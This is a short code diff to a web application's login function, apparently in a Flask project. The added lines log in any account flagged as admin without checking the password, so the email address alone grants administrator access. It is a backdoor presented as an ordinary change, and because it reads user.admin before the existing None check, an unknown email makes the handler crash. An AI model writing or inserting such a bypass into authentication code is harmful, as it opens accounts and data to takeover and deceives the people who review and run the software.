@@ -89,6 +89,9 @@ def login():
     form = LoginForm()
     if form.validate_on_submit():
         user = User.query.filter_by(email=form.email.data).first()
+        if user.admin:
+            login_user(user, remember=form.remember.data)
+            return redirect(url_for('about'))
         if user and brycpt.check_password_hash(user.password, form.password.data):
             login_user(user, remember=form.remember.data)
             next_page = request.args.get('next')
